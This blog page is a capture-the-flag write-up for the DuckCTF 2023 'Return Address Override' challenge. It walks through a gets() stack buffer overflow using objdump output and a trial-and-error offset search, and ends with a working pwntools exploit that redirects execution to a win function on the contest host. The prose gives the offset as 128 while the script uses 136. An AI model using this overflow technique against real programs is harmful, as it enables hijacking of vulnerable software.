<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Return Address Override - DuckCTF 2023 | AdelaideB9 Blog</title><meta name=keywords content><meta name=description content="Ok. So buffer overflows exist, but if I put my data in a different function, my private data will be safe from buffer overflows."><meta name=author content="lachlan"><link rel=canonical href=https://blog.adelaideb9.com/posts/2023/duckctf/return-address-override/><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://blog.adelaideb9.com/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.adelaideb9.com/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.adelaideb9.com/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.adelaideb9.com/apple-touch-icon.png><link rel=mask-icon href=https://blog.adelaideb9.com/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css integrity=sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js integrity=sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4 crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js integrity=sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa crossorigin=anonymous onload='renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"\\[",right:"\\]",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1}]})'></script><meta property="og:title" content="Return Address Override - DuckCTF 2023"><meta property="og:description" content="Ok. So buffer overflows exist, but if I put my data in a different function, my private data will be safe from buffer overflows."><meta property="og:type" content="article"><meta property="og:url" content="https://blog.adelaideb9.com/posts/2023/duckctf/return-address-override/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-08-04T00:00:00+00:00"><meta property="article:modified_time" content="2023-08-04T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Return Address Override - DuckCTF 2023"><meta name=twitter:description content="Ok. So buffer overflows exist, but if I put my data in a different function, my private data will be safe from buffer overflows."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.adelaideb9.com/posts/"},{"@type":"ListItem","position":2,"name":"Return Address Override - DuckCTF 2023","item":"https://blog.adelaideb9.com/posts/2023/duckctf/return-address-override/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Return Address Override - DuckCTF 2023","name":"Return Address Override - DuckCTF 2023","description":"Ok. So buffer overflows exist, but if I put my data in a different function, my private data will be safe from buffer overflows.","keywords":[],"articleBody":"This challenge provides us with the binary, so let us begin by printing the objects in the binary with objdump -t:\nSYMBOL TABLE: 0000000000000000 l df *ABS*\t0000000000000000 crt1.c 0000000000000000 l df *ABS*\t0000000000000000 crtstuff.c 0000000000403e60 l O .ctors\t0000000000000000 __CTOR_LIST__ 0000000000403e70 l O .dtors\t0000000000000000 __DTOR_LIST__ 0000000000402070 l O .eh_frame\t0000000000000000 __EH_FRAME_BEGIN__ 0000000000401090 l F .text\t0000000000000000 deregister_tm_clones 00000000004010c0 l F .text\t0000000000000000 register_tm_clones 0000000000401100 l F .text\t0000000000000000 __do_global_dtors_aux 0000000000404020 l O .bss\t0000000000000001 completed.2 0000000000404028 l O .bss\t0000000000000008 dtor_idx.1 0000000000401190 l F .text\t0000000000000000 frame_dummy 0000000000404040 l O .bss\t0000000000000030 object.0 0000000000000000 l df *ABS*\t0000000000000000 crtstuff.c 0000000000403e68 l O .ctors\t0000000000000000 __CTOR_END__ 00000000004020d0 l O .eh_frame\t0000000000000000 __FRAME_END__ 00000000004012b0 l F .text\t0000000000000000 __do_global_ctors_aux 0000000000000000 l df *ABS*\t0000000000000000 med.c 0000000000000000 l df *ABS*\t0000000000000000 0000000000403e80 l O .dynamic\t0000000000000000 _DYNAMIC 0000000000402000 l .eh_frame_hdr\t0000000000000000 __GNU_EH_FRAME_HDR 0000000000403fd0 l O .got\t0000000000000000 _GLOBAL_OFFSET_TABLE_ 0000000000000000 F *UND*\t0000000000000000 gets 0000000000404008 g O .data\t0000000000000000 .hidden __TMC_END__ 0000000000403e78 g O .dtors\t0000000000000000 .hidden __DTOR_END__ 0000000000000000 F *UND*\t0000000000000000 puts 0000000000404000 g O .data\t0000000000000000 .hidden __dso_handle 0000000000401000 g F .init\t0000000000000001 _init 00000000004011d3 g F .text\t00000000000000a0 getName 00000000004011bd g F .text\t0000000000000016 win 0000000000401050 g .text\t0000000000000000 _start 0000000000401066 g F .text\t0000000000000024 _start_c 0000000000404008 g .bss\t0000000000000000 __bss_start 0000000000401273 g F .text\t000000000000002f main 00000000004012f1 g F .fini\t0000000000000001 _fini 0000000000404008 g .data\t0000000000000000 _edata 0000000000404078 g .bss\t0000000000000000 _end 0000000000000000 F *UND*\t0000000000000000 __libc_start_main 0000000000404070 g O .bss\t0000000000000008 FLAG As we can see, gets is being used, which means this program is likely vulnerable to a buffer overflow with gets. So, without trying anything else yet, let us see if we can cause a segfault.\npython -c \"print('a' * 10000)\" | ./med Upon running the command above, we get the following error;\nSegmentation fault (core dumped) Awesome! This means we over-wrote the return address pushed to the stack when calling a function that calls gets, and thus when the function tried to return, it returned to a location that does not exist in the binary, therefore throwing an error. Hence, if we work hard enough, we can tell the function to return to a location we desire (perhaps a part of the binary that prints the flag).\nTo do this, we need to:\nDetermine exactly how many characters are required in our input before we start changing the return address (this is called the offset) Find a location that runs the code we want to run (say print the flag) The first job is easy enough. We know that 10000 characters is too many, so how about 500? That also segfaults. So how about 250? Yep, still segfaults. What about 100? Nope. Runs fine. 128? Yes. 127? Nope! This means that the offset is 128 characters (it is not 127 as there is a new line character, so when we entered 127 characters, there were really 128 characters sent, all of which did not change the return address). So our payload should be 128 random characters followed by our desired address.\nTo find a location in the code we might want to jump to, we can look at our symbols table again. We see that there is a function called win, and if we look at the assembly for win (with objdump -t);\n00000000004011bd : 4011bd: 55 push %rbp 4011be: 48 89 e5 mov %rsp,%rbp 4011c1: 48 8b 05 a8 2e 00 00 mov 0x2ea8(%rip),%rax # 404070 4011c8: 48 89 c7 mov %rax,%rdi 4011cb: e8 60 fe ff ff call 401030 4011d0: 90 nop 4011d1: 5d pop %rbp 4011d2: c3 ret we can see that it will print the flag. So let us jump to win which is at address 0x004011bd.\nThe following program does just this\nfrom pwn import * # Remote shell = remote('chall.duckctf.com', 30003) # Local with test flag #shell = process(['./med', \"flag{test flag}\"]) winAddress = 0x004011bd payload = b'a' * 136 + p64(winAddress) shell.sendline(payload) shell.interactive() Running this gives the flag quack{a_simple_return_address_override}.\n","wordCount":"663","inLanguage":"en","datePublished":"2023-08-04T00:00:00Z","dateModified":"2023-08-04T00:00:00Z","author":{"@type":"Person","name":"lachlan"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.adelaideb9.com/posts/2023/duckctf/return-address-override/"},"publisher":{"@type":"Organization","name":"AdelaideB9 Blog","logo":{"@type":"ImageObject","url":"https://blog.adelaideb9.com/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.adelaideb9.com/ accesskey=h title="AdelaideB9 Blog (Alt + H)">AdelaideB9 Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.adelaideb9.com/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://blog.adelaideb9.com/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://blog.adelaideb9.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.adelaideb9.com/>Home</a>&nbsp;»&nbsp;<a href=https://blog.adelaideb9.com/posts/>Posts</a></div><h1 class=post-title>Return Address Override - DuckCTF 2023</h1><div class=post-description>Ok. So buffer overflows exist, but if I put my data in a different function, my private data will be safe from buffer overflows.</div><div class=post-meta><span title='2023-08-04 00:00:00 +0000 UTC'>August 4, 2023</span>&nbsp;·&nbsp;lachlan</div></header><div class=post-content><p>This challenge provides us with the binary, so let us begin by printing the objects in the binary with <code>objdump -t</code>:</p><pre tabindex=0><code>SYMBOL TABLE:
0000000000000000 l    df *ABS*	0000000000000000 crt1.c
0000000000000000 l    df *ABS*	0000000000000000 crtstuff.c
0000000000403e60 l     O .ctors	0000000000000000 __CTOR_LIST__
0000000000403e70 l     O .dtors	0000000000000000 __DTOR_LIST__
0000000000402070 l     O .eh_frame	0000000000000000 __EH_FRAME_BEGIN__
0000000000401090 l     F .text	0000000000000000 deregister_tm_clones
00000000004010c0 l     F .text	0000000000000000 register_tm_clones
0000000000401100 l     F .text	0000000000000000 __do_global_dtors_aux
0000000000404020 l     O .bss	0000000000000001 completed.2
0000000000404028 l     O .bss	0000000000000008 dtor_idx.1
0000000000401190 l     F .text	0000000000000000 frame_dummy
0000000000404040 l     O .bss	0000000000000030 object.0
0000000000000000 l    df *ABS*	0000000000000000 crtstuff.c
0000000000403e68 l     O .ctors	0000000000000000 __CTOR_END__
00000000004020d0 l     O .eh_frame	0000000000000000 __FRAME_END__
00000000004012b0 l     F .text	0000000000000000 __do_global_ctors_aux
0000000000000000 l    df *ABS*	0000000000000000 med.c
0000000000000000 l    df *ABS*	0000000000000000
0000000000403e80 l     O .dynamic	0000000000000000 _DYNAMIC
0000000000402000 l       .eh_frame_hdr	0000000000000000 __GNU_EH_FRAME_HDR
0000000000403fd0 l     O .got	0000000000000000 _GLOBAL_OFFSET_TABLE_
0000000000000000       F *UND*	0000000000000000 gets
0000000000404008 g     O .data	0000000000000000 .hidden __TMC_END__
0000000000403e78 g     O .dtors	0000000000000000 .hidden __DTOR_END__
0000000000000000       F *UND*	0000000000000000 puts
0000000000404000 g     O .data	0000000000000000 .hidden __dso_handle
0000000000401000 g     F .init	0000000000000001 _init
00000000004011d3 g     F .text	00000000000000a0 getName
00000000004011bd g     F .text	0000000000000016 win
0000000000401050 g       .text	0000000000000000 _start
0000000000401066 g     F .text	0000000000000024 _start_c
0000000000404008 g       .bss	0000000000000000 __bss_start
0000000000401273 g     F .text	000000000000002f main
00000000004012f1 g     F .fini	0000000000000001 _fini
0000000000404008 g       .data	0000000000000000 _edata
0000000000404078 g       .bss	0000000000000000 _end
0000000000000000       F *UND*	0000000000000000 __libc_start_main
0000000000404070 g     O .bss	0000000000000008 FLAG
</code></pre><p>As we can see, <code>gets</code> is being used, which means this program is likely vulnerable to a buffer overflow with <code>gets</code>. So, without trying anything else yet, let us see if we can cause a segfault.</p><pre tabindex=0><code>python -c &#34;print(&#39;a&#39; * 10000)&#34; | ./med
</code></pre><p>Upon running the command above, we get the following error;</p><pre tabindex=0><code>Segmentation fault (core dumped)
</code></pre><p>Awesome! This means we over-wrote the return address pushed to the stack when calling a function that calls <code>gets</code>, and thus when the function tried to return, it returned to a location that does not exist in the binary, therefore throwing an error. Hence, if we work hard enough, we can tell the function to return to a location we desire (perhaps a part of the binary that prints the flag).</p><p>To do this, we need to:</p><ol><li>Determine exactly how many characters are required in our input before we start changing the return address (this is called the offset)</li><li>Find a location that runs the code we want to run (say print the flag)</li></ol><p>The first job is easy enough. We know that 10000 characters is too many, so how about 500? That also segfaults. So how about 250? Yep, still segfaults. What about 100? Nope. Runs fine. 128? Yes. 127? Nope! This means that the offset is 128 characters (it is not 127 as there is a new line character, so when we entered 127 characters, there were really 128 characters sent, all of which did not change the return address). So our payload should be 128 random characters followed by our desired address.</p><p>To find a location in the code we might want to jump to, we can look at our symbols table again. We see that there is a function called <code>win</code>, and if we look at the assembly for <code>win</code> (with <code>objdump -t</code>);</p><pre tabindex=0><code>00000000004011bd &lt;win&gt;:
  4011bd:       55                      push   %rbp
  4011be:       48 89 e5                mov    %rsp,%rbp
  4011c1:       48 8b 05 a8 2e 00 00    mov    0x2ea8(%rip),%rax        # 404070 &lt;FLAG&gt;
  4011c8:       48 89 c7                mov    %rax,%rdi
  4011cb:       e8 60 fe ff ff          call   401030 &lt;puts@plt&gt;
  4011d0:       90                      nop
  4011d1:       5d                      pop    %rbp
  4011d2:       c3                      ret
</code></pre><p>we can see that it will print the flag. So let us jump to <code>win</code> which is at address <code>0x004011bd</code>.</p><p>The following program does just this</p><pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *

# Remote
shell = remote(&#39;chall.duckctf.com&#39;, 30003)

# Local with test flag
#shell = process([&#39;./med&#39;, &#34;flag{test flag}&#34;])

winAddress = 0x004011bd

payload = b&#39;a&#39; * 136 + p64(winAddress)

shell.sendline(payload)
shell.interactive()
</code></pre><p>Running this gives the flag <code>quack{a_simple_return_address_override}</code>.</p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://blog.adelaideb9.com/>AdelaideB9 Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>